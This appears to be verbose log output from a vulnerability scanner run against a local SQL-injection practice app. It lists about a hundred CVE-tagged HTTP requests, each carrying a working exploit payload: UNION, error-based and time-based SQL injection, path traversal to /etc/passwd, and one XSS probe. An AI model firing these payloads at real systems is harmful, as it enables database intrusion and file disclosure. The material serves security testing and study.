+[VER] [CVE-2024-5522] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-json/h5vp/v1/video/0?id=1&id='+union+all+select+concat(0x64617461626173653a,1,0x7c76657273696f6e3a,2,0x7c757365723a,md5(999999999)),2,3,4,5,6,7,8--+-&Submit=Submit
+[VER] [sound4-password-auth-bypass] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/index.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2021-37538] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/module/smartblog/archive?id=1&Submit=Submit&month=1&year=1&day=1%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,(SELECT%20MD5(55555)),NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20-
+[VER] [leaguemanager-sql-injection] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit&season=1&league_id=1season=1&league_id=1'+AND+(SELECT+1909+FROM+(SELECT(SLEEP(6)))ZiBf)--+qODp&match_day=1&match_day=1&team_id=1&team_id=1
+[VER] [zero-spam-sql-injection] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2022-38812] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/author_posts.php?id=1&Submit=Submit&author=admin%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(md5(999999999),1,1),NULL,NULL,NULL,NULL--%20-&p_id=1
+[VER] [chanjet-gnremote-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/GNRemote.dll?id=1&id=1&Submit=Submit&Submit=Submit&GNFunction=LoginServer&decorator=text_wrap&frombrowser=esl
+[VER] [CVE-2024-8877] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/cgi-bin/db_eventlog_w.cgi?id=1&Submit=Submit&date_start=0&date_end=1715630160&gravity=%25&type=%25%27and/**/%271%27=%271
+[VER] [seacms-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/comment/api/index.php?id=1&Submit=Submit&gid=1&page=2&rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20md5(999999999)))),@`%27`
+[VER] [CVE-2019-17418] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/admin/?id=1&Submit=Submit&n=language&c=language_general&a=doSearchParameter&editor=cn&word=search&appno=0+union+select+98989*443131,1--+&site=admin
+[VER] [duomicms-sql-injection] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/duomiphp/ajax.php?id=1&id=1&Submit=Submit&action=addfav&uid=1%20and%20extractvalue(1,concat_ws(1,1,md5(999999999)))
+[VER] [CVE-2020-22208] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/plus/ajax_street.php?id=1&Submit=Submit&act=alphabet&x=11%ef%bf%bd%27%20union%20select%201,2,3,concat(0x3C2F613E20),5,6,7,md5(999999999),9%20from%20qs_admin
+[VER] [CVE-2021-34187] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/main/inc/ajax/model.ajax.php?id=1&Submit=Submit&a=get_sessions_tracking&work_id=1&rows=0&page=1&sidx=0&sord=test&_search=1&searchField=1))and(1)%20UNION%20ALL%20SELECT%20CONCAT((select+extractvalue(0x0a,concat(0x0a,(md5(999999999)))))),NULL,NULL,NULL--%20-)and((1=&searchOper=ni&searchString=testx&filters2={}&from_course_session=0
+[VER] [CVE-2022-38812] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/cms/author_posts.php?id=1&Submit=Submit&author=admin%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(md5(999999999),1,1),NULL,NULL,NULL,NULL--%20-&p_id=1
+[VER] [CVE-2022-31984] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/admin/requests/take_action.php?id=1&id=6'+UNION+ALL+SELECT+md5('999999999'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-&Submit=Submit
+[VER] [CVE-2020-22211] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/plus/ajax_street.php?id=1&Submit=Submit&act=key&key=%E9%8C%A6%27%20union%20select%201,2,3,4,5,6,7,md5(999999999),9%23
+[VER] [error-based-sql-injection] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/'?id=1&Submit=Submit
+[VER] [CVE-2020-10549] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/snippets.inc.php?id=1&Submit=Submit&search=True&searchField=antani'+union+select+(select+concat(0x223e3c42523e5b70726f6a6563742d646973636f766572795d)+limit+0,1),NULL,NULL,NULL+--+&searchColumn=snippetName&searchOption=contains
+[VER] [CVE-2020-10548] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/devices.inc.php?id=1&Submit=Submit&search=True&searchField=antani'+union+select+(select+concat(0x223e3c42523e5b70726f6a6563742d646973636f766572795d)+limit+0,1),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL+--+&searchColumn=n.id&searchOption=contains
+[VER] [CVE-2014-8682] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/api/v1/repos/search?id=1&Submit=Submit&q=%27)%09UNION%09SELECT%09*%09FROM%09(SELECT%09null)%09AS%09a1%09%09JOIN%09(SELECT%091)%09as%09u%09JOIN%09(SELECT%09user())%09AS%09b1%09JOIN%09(SELECT%09user())%09AS%09b2%09JOIN%09(SELECT%09null)%09as%09a3%09%09JOIN%09(SELECT%09null)%09as%09a4%09%09JOIN%09(SELECT%09null)%09as%09a5%09%09JOIN%09(SELECT%09null)%09as%09a6%09%09JOIN%09(SELECT%09null)%09as%09a7%09%09JOIN%09(SELECT%09null)%09as%09a8%09%09JOIN%09(SELECT%09null)%09as%09a9%09JOIN%09(SELECT%09null)%09as%09a10%09JOIN%09(SELECT%09null)%09as%09a11%09JOIN%09(SELECT%09null)%09as%09a12%09JOIN%09(SELECT%09null)%09as%09a13%09%09JOIN%09(SELECT%09null)%09as%09a14%09%09JOIN%09(SELECT%09null)%09as%09a15%09%09JOIN%09(SELECT%09null)%09as%09a16%09%09JOIN%09(SELECT%09null)%09as%09a17%09%09JOIN%09(SELECT%09null)%09as%09a18%09%09JOIN%09(SELECT%09null)%09as%09a19%09%09JOIN%09(SELECT%09null)%09as%09a20%09%09JOIN%09(SELECT%09null)%09as%09a21%09%09JOIN%09(SELECT%09null)%09as%09a22%09where%09(%27%25%27=%27
+[VER] [CVE-2019-13462] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/WidgetHandler.ashx?id=1&Submit=Submit&MethodName=Sort&ID=1&row=1&column=%28SELECT%20CONCAT%28CONCAT%28CHAR%28126%29%2C%28SELECT%20SUBSTRING%28%28ISNULL%28CAST%28db_name%28%29%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%2C1%2C1024%29%29%29%2CCHAR%28126%29%29%29
+[VER] [CVE-2022-24124] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/api/get-organizations?id=1&Submit=Submit&p=123&pageSize=123&value=cfx&sortField&sortOrder&field=updatexml(1,version(),1)
+[VER] [CVE-2023-2130] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/admin/suppliers/view_details.php?id=1&id=1'+AND+(SELECT+9687+FROM+(SELECT(SLEEP(6)))pnac)+AND+'ARHJ'='ARHJ&Submit=Submit
+[VER] [CVE-2024-32737] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/api/v1/confup?id=1&Submit=Submit&mode=lean&uid=1'%20UNION%20select%201,2,3,sqlite_version();--
+[VER] [CNVD-2017-06001] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/portal/attachment_clearTempFile.action?id=1&Submit=Submit&bean.RecId=1')+AND+EXTRACTVALUE(534543,CONCAT(0x5c,md5(999999999),0x5c))+AND+('n72Yk'='n72Yk&bean.TabName=1
+[VER] [CVE-2022-25488] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/admin/ajax/avatar.php?id=1&id=-1+union+select+md5(999999999)%23&Submit=Submit
+[VER] [CVE-2024-32739] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/api/v1/ndconfig?id=1&Submit=Submit&mode&uid=1'%20UNION%20select%201,2,3,sqlite_version();--
+[VER] [shiziyu-cms-apicontroller-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/index.php?id=1&Submit=Submit&s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,md5(999999999),0x7e),1)
+[VER] [CVE-2024-32736] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/api/v1/confup?id=1&Submit=Submit&mode&uid=1'%20UNION%20select%201,2,3,4,sqlite_version();--
+[VER] [CVE-2024-36837] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/api/products?id=1&Submit=Submit&limit=20&priceOrder&salesOrder&selectId=GTID_SUBSET(CONCAT(0x7e,(SELECT+(ELT(3550=3550,md5(9395144)))),0x7e),3550)
+[VER] [jeeplus-cms-resetpassword-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/a/sys/user/resetPassword?id=1&Submit=Submit&mobile=13588888888%27and%20(updatexml(1,concat(0x7e,(select%20md5(999999999)),0x7e),1))%23
+[VER] [CVE-2017-11444] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/search/members/?id=1&Submit=Submit&id`%3D520)%2f**%2funion%2f**%2fselect%2f**%2f1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2Cunhex%28%27716b793573%27%29%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%2C29%2C30%2C31%2C32%23sqli=1
+[VER] [CVE-2020-8654] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/css/eonweb.css?id=1&Submit=Submit
+[VER] [joomla-marvikshop-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/index.php?id=1&Submit=Submit&option=com_oscommerce&osMod=mshop_pl_src&manufacturers_id=7&sort=products_sort_order&sort=latest&page=index.php&format=xml&task=showproducts&view=med&sortdir=%27
+[VER] [CVE-2020-10547] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/compliancepolicyelements.inc.php?id=1&Submit=Submit&search=True&searchField=antani'+union+select+(select+concat(0x223e3c42523e5b70726f6a6563742d646973636f766572795d)+limit+0,1),NULL,NULL,NULL,NULL+--+&searchColumn=elementName&searchOption=contains
+[VER] [CNVD-2017-06001] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/portal/attachment_getAttList.action?id=1&Submit=Submit&bean.RecId=1')+AND+EXTRACTVALUE(534543,CONCAT(0x5c,md5(999999999),0x5c))+AND+('n72Yk'='n72Yk&bean.TabName=1
+[VER] [arcade-php-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/arcade.php?id=1&Submit=Submit&act=Arcade&do=stats&comment=a&s_id=1'
+[VER] [CVE-2024-9796] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-content/plugins/wp-advanced-search/class.inc/autocompletion/autocompletion-PHP5.5.php?id=1&Submit=Submit&q=admin&t=wp_users%20--&f=user_login&type&e
+[VER] [CVE-2025-10210] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/api/v1/search?id=1&Submit=Submit&key=%27%20and%20extractvalue(1,concat(0x7e,%27c98049c3635d023f5667bbb9ed4920cb%27,0x7e))--%20a
+[VER] [CVE-2025-52472] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/xwiki/rest/wikis/xwiki/search?id=1&Submit=Submit&q=test&scope=title&orderField=doc.fullName%20from%20XWikiDocument%20as%20doc%20where%20%24%24%3D%27%24%24%3Dconcat(chr(61)%2Cchr(39))%20and%20version()%7C%7Cpg_sleep(1)%3Dversion()%7C%7Cpg_sleep(1)%20and%20(1%3D1%20or%20%3F%3D%3F%20or%20%3F%3D%3F%20or%20%3F%3D%3F%20or%20%3F%3D%3F%20or%20%3F%3D%3F)%20--%20comment%27%20or%20a%3D%27%20order%20by%20doc.fullName
+[VER] [yonyou-u8-oa-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/yyoa/common/js/menu/test.jsp?id=1&Submit=Submit&doType=101&S1=(SELECT%20md5(999999999))
+[VER] [CVE-2021-28854] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/agc/vicidial_mysqli_errors.txt?id=1&Submit=Submit
+[VER] [CVE-2017-17731] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/plus/recommend.php?id=1&Submit=Submit&action&aid=1&_FILES[type][tmp_name]=\%27%20or%20mid=@`\%27`%20/*!50000union*//*!50000select*/1,2,3,md5(999999999),5,6,7,8,9%23@`\%27`+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=4294
+[VER] [CVE-2021-34187] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/main/inc/ajax/model.ajax.php?id=1&Submit=Submit&a=get_sessions_tracking&work_id=1&rows=0&page=1&sidx=0&sord=test&_search=1&searchField=1))and(1)%20UNION%20ALL%20SELECT%20CONCAT((select+md5(999999999))),NULL,NULL,NULL--%20-)and((1=&searchOper=ni&searchString=testx&filters2={}&from_course_session=0
+[VER] [chanjet-crm-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/webservice/get_usedspace.php?id=1&Submit=Submit&site_id=-1%20and%201=2%20union%20all%20select%20(md5(999999999))
+[VER] [weaver-checkserver-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/mobile/plugin/CheckServer.jsp?id=1&Submit=Submit&type=mobileSetting
+[VER] [CNVD-2021-32799] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/api/dp/rptsvcsyncpoint?id=1&Submit=Submit&ccid=1
+[VER] [CVE-2024-32738] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/api/v1/ndconfig?id=1&Submit=Submit&mode=lean&uid=1'%20UNION%20select%201,2,3,sqlite_version();--
+[VER] [CVE-2018-10736] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/nagiosql/admin/info.php?id=1&Submit=Submit&key1=%27%20union%20select%20concat(md5(2050338224))%23
+[VER] [CVE-2015-7297] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/index.php?id=1&Submit=Submit&option=com_contenthistory&view=history&list[ordering]&item_id=1&type_id=1&list[select]=updatexml(0x23,concat(1,md5(999999999)),1)
+[VER] [CVE-2022-38627] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/badging/badge_template_print.php?id=1&Submit=Submit&tpl=aa.xml&idt=1337%20UNION%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,%273EOKvYy5OHLwSlqNOHpXhTG56Y3%27||%27CVE%27||(7*7*7*7)||SWVersion,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL%20from%20version
+[VER] [CVE-2021-34187] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/main/inc/ajax/model.ajax.php?id=1&Submit=Submit&a=get_sessions_tracking&work_id=1&rows=0&page=1&sidx=0&sord=test&_search=1&searchField=1))and(1)%20UNION%20ALL%20SELECT%20CONCAT((select+extractvalue(0x0a,concat(0x0a,(md5(999999999)))))),NULL,NULL,NULL--%20-)and((1=&searchOper=ni&searchString=testx&filters2={}&from_course_session=0
+[VER] [CVE-2025-34038] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/js/hrm/getdata.jsp?id=1&Submit=Submit&cmd=getSelectAllId&sql=select+547653*865674+as+id
+[VER] [CVE-2022-30512] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/dms/admin/accounts/payment_history.php?id=1&Submit=Submit&account_id=2%27
+[VER] [joomla-department-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/index.php?id=1&id=-1%20UNION%20SELECT%201,md5(999999999),3,4,5,6,7,8--&Submit=Submit&option=com_departments
+[VER] [CVE-2020-10546] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/compliancepolicies.inc.php?id=1&Submit=Submit&search=True&searchColumn=policyName&searchOption=contains&searchField=antani'+union+select+(select+concat(0x223e3c42523e5b70726f6a6563742d646973636f766572795d)+limit+0,1),NULL,NULL+--+
+[VER] [dotnetcms-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/user/City_ajax.aspx?id=1&Submit=Submit&CityId=33'union%20select%20sys.fn_sqlvarbasetostr(HashBytes('MD5','3EOKvYACTYMh1sAu0fnZDFX9ZpI')),2--
+[VER] [CVE-2020-22209] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/plus/ajax_common.php?id=1&Submit=Submit&act=hotword&query=aa%%e9%8c%a6%27%20union%20select%201,md5(999999999),3%23%27
+[VER] [CVE-2022-32018] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/index.php?id=1&Submit=Submit&q=hiring&search=URC%27%20union%20select%201,2,3,4,5,6,7,8,9,md5(999999999),11,12,13,14,15,16,17,18,19--+
+[VER] [phpok-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/api.php?id=1&id=news&Submit=Submit&c=project&f=index&token=1234&sort=1+and+extractvalue(1,concat(0x7e,md5(999999999)))+--+
+[VER] [CVE-2019-16996] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/admin/?id=1&id=1%20union%20SELECT%201,2,3,25367*75643,5,6,7%20limit%205,1%20%23&Submit=Submit&n=product&c=product_admin&a=dopara&app_type=shop
+[VER] [CVE-2020-22210] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/plus/ajax_officebuilding.php?id=1&Submit=Submit&act=key&key=%e9%8c%a6%27%20a<>nd%201=2%20un<>ion%20sel<>ect%201,2,3,md5(999999999),5,6,7,8,9%23
+[VER] [zcms-v3-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/admin/cms_channel.php?id=1&Submit=Submit&del=123456+AND+(SELECT+1+FROM(SELECT+COUNT(*)%2cCONCAT(0x7e%2cmd5(999999999)%2c0x7e%2cFLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x)a)--%2b'
+[VER] [CVE-2019-10692] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit&rest_route=/wpgmza/v1/markers&filter=%7b%7d&fields=%2a%20from%20wp_users--%20-
+[VER] [CVE-2016-6195] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/forumrunner/request.php?id=1&Submit=Submit&d=1&cmd=get_spam_data&postids=-1%27
+[VER] [CVE-2022-32015] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/index.php?id=1&Submit=Submit&q=category&search=Banking%27%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,md5(999999999),15,16,17,18,19--+
+[VER] [yonyou-ksoa-dept-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/common/dept.jsp?id=1&Submit=Submit&deptid=1'+UNION+ALL+SELECT+60%2Csys.fn_sqlvarbasetostr(HASHBYTES('MD5'%2C'999999999'))--+
+[VER] [CVE-2018-10735] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/nagiosql/admin/commandline.php?id=1&Submit=Submit&cname=%27%20union%20select%20concat(md5(2053789193))%23
+[VER] [fumasoft-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/Ajax/AjaxMethod.ashx?id=1&Submit=Submit&action=getEmpByname&Name=Y'+union+select+substring(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','999999999')),3,32)--
+[VER] [CVE-2020-17506] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/fw.login.php?id=1&Submit=Submit&apikey=%27UNION%20select%201,%27YToyOntzOjM6InVpZCI7czo0OiItMTAwIjtzOjIyOiJBQ1RJVkVfRElSRUNUT1JZX0lOREVYIjtzOjE6IjEiO30=%27;
+[VER] [pbootcms-database-file-download] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/data/pbootcms.db?id=1&Submit=Submit
+[VER] [weaver-ecology-getsqldata-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/Api/portal/elementEcodeAddon/getSqlData?id=1&Submit=Submit&sql=select%20substring(sys.fn_sqlvarbasetostr(hashbytes('MD5','999999999')),3,32)
+[VER] [CVE-2017-8917] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/index.php?id=1&Submit=Submit&option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,md5(999999999)),1)
+[VER] [74cms-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/index.php?id=1&Submit=Submit&m&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=test")+and+extractvalue(1,concat(0x7e,md5(999999999)))+--+a
+[VER] [CVE-2016-10134] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/jsrpc.php?id=1&Submit=Submit&type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0xa,user()),0)::
+[VER] [ecology-syncuserinfo-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/mobile/plugin/SyncUserInfo.jsp?id=1&Submit=Submit&userIdentifiers=-1)union(select(3),null,null,null,null,null,str(98989*44313),null
+[VER] [CVE-2022-25125] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/mdiy/dict/listExcludeApp?id=1&Submit=Submit&query=1&dictType=1&orderBy=1/**/or/**/updatexml(1,concat(0x7e,md5('999999999'),0x7e),1)/**/or/**/1
+[VER] [CVE-2016-6195] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/boards/forumrunner/request.php?id=1&Submit=Submit&d=1&cmd=get_spam_data&postids=-1%27
+[VER] [CVE-2018-7314] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/index.php?id=1&id=1&Submit=Submit&option=com_prayercenter&task=confirm&sessionid=1'+AND+EXTRACTVALUE(22,CONCAT(0x7e,md5(968300851)))--+X
+[VER] [CNVD-2022-36985] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/api/sms_check.php?id=1&Submit=Submit&param=1%27%20and%20updatexml(1,concat(0x7e,(SELECT%20md5(999999999)),0x7e),1)--%20
+[VER] [weaver-ecology-hrmcareer-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1&id=1%20union%20select%201,2,sys.fn_sqlvarbasetostr(HashBytes('MD5','999999999')),4,5,6,7&Submit=Submit
+[VER] [CVE-2016-6195] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/board/forumrunner/request.php?id=1&Submit=Submit&d=1&cmd=get_spam_data&postids=-1%27
+[VER] [dedecms-membergroup-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/member/ajax_membergroup.php?id=1&Submit=Submit&action=post&membergroup=@`'`/*!50000Union+*/+/*!50000select+*/+md5(999999999)+--+@`'`
+[VER] [CVE-2021-31856] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/api/experimental/patternfile?id=1&Submit=Submit&order=id%3Bselect(md5(999999999))&page=0&page_size=0
+[VER] [weaver-ecology-getsqldata-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/Api/portal/elementEcodeAddon/getSqlData?id=1&Submit=Submit&sql
+[VER] [CVE-2025-32429] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/xwiki/rest/liveData/sources/liveTable/entries?id=1&Submit=Submit&sourceParams.template=getdeleteddocuments.vm&sort=injected
+[VER] [CVE-2020-20300] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/public/index.php/home/index/bind_follow/?id=1&Submit=Submit&publicid=1&is_ajax=1&uid[0]=exp&uid[1]=)%20and%20updatexml(1,concat(0x7e,md5('999999'),0x7e),1)--++
+[VER] [CVE-2020-29227] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/index.php?id=1&Submit=Submit&page=/etc/passwd%00
+[VER] [etouch-v2-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/upload/mobile/index.php?id=1&Submit=Submit&c=category&a=asynclist&price_max=1.0%20AND%20(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT(0x7e,md5(999999999),0x7e,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)''
+[VER] [CVE-2022-0169] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&Submit=Submit&action=bwg_frontend_data&shortcode_id=1&bwg_tag_id_bwg_thumbnails_0[]=)%22%20union%20select%201,2,3,4,5,6,7,concat(md5(999999999),%200x2c,%208),9,10,11,12,13,14,15,16,17,18,19,20,21,22,23%20--%20g
+[VER] [CVE-2016-6195] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/forum/forumrunner/request.php?id=1&Submit=Submit&d=1&cmd=get_spam_data&postids=-1%27
+[VER] [CVE-2020-10220] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/commands.inc.php?id=1&Submit=Submit&searchOption=contains&searchField=vuln&search=search&searchColumn=command%20UNION%20ALL%20SELECT%20(SELECT%20CONCAT(0x223E3C42523E5B50574E5D,md5('999999999'),0x5B50574E5D3C42523E)%20limit%200,1),NULL--
+[VER] [CVE-2010-4977] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/index.php?id=1&Submit=Submit&option=com_canteen&controller=../../../../../etc/passwd%00
+[VER] [CVE-2019-10232] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/glpi/scripts/unlock_tasks.php?id=1&Submit=Submit&cycle=1%20UNION%20ALL%20SELECT%201,(@@version)--%20&only_tasks=1
+[VER] [CVE-2016-6195] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/forums/forumrunner/request.php?id=1&Submit=Submit&d=1&cmd=get_spam_data&postids=-1%27
+[VER] [CVE-2010-5028] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/index.php?id=1&Submit=Submit&option=com_jejob&view=../../../../../../etc/passwd%00
+[VER] [CVE-2019-10232] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/scripts/unlock_tasks.php?id=1&Submit=Submit&cycle=1%20UNION%20ALL%20SELECT%201,(@@version)--%20&only_tasks=1
+[VER] [CVE-2016-6195] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/vb/forumrunner/request.php?id=1&Submit=Submit&d=1&cmd=get_spam_data&postids=-1%27
+[VER] [exposed-sqlite-manager] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit
+[VER] [exposed-sqlite-manager] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/sqlite/?id=1&Submit=Submit
+[VER] [CVE-2020-14092] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit&cffaction=get_data_from_database&query=SELECT%20*%20from%20wp_users
+[VER] [exposed-sqlite-manager] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/sqlitemanager/?id=1&Submit=Submit
+[VER] [CVE-2021-29625] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit&server=db&username=root&db=mysql&table=event%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[VER] [CVE-2023-40748] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/index.php?id=1&Submit=Submit&controller=pjAdminOrders%26action%3dpjActionGetNewOrder%26column%3dcreated%26direction%3dASC%26page%3d1%26rowCount%3d50%26q%3d-1910%27)+OR+6100%3d6100%23%26type%3d
+[VER] [cmseasy-crossall-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit&case=crossall&act=execsql&sql=WY8gzSfZwW9R5YvyK
+[VER] [CVE-2021-24666] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/index.php?id=1&id=1%20UNION%20ALL%20SELECT%20NULL,NULL,md5('CVE-2021-24666'),NULL,NULL,NULL--%20-&Submit=Submit&rest_route=/podlove/v1/social/services/contributor/1
+[VER] [finecms-sqli] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/index.php?id=1&Submit=Submit&c=api&m=data2&auth=582f27d140497a9d8f048ca085b111df&param=action=sql%20sql=%27select%20md5(999999999)%27
+[VER] [CVE-2026-1207] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit&band=1)%20AND%201=CAST((SELECT%20version())%20AS%20INT)--
+[VER] [CVE-2026-1207] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/api/raster/search/?id=1&Submit=Submit&band=1)%20AND%201=CAST((SELECT%20version())%20AS%20INT)--
+[VER] [thinkphp-509-information-disclosure] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/index.php?id=1&Submit=Submit&ids[0,updatexml(0,concat(0xa,user()),0)]=1
+[VER] [CVE-2023-40749] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/index.php?id=1&Submit=Submit&controller=pjAdminOrders%26action%3dpjActionGetNewOrder%26column%3d(SELECT+(CASE+WHEN+(4213%3d4213)+THEN+0x63726561746564+ELSE+(SELECT+7877+UNION+SELECT+7153)+END))%26direction%3dASC%26page%3d1%26rowCount%3d50%26q%3d%e2%80%99%e2%80%99%26type%3d
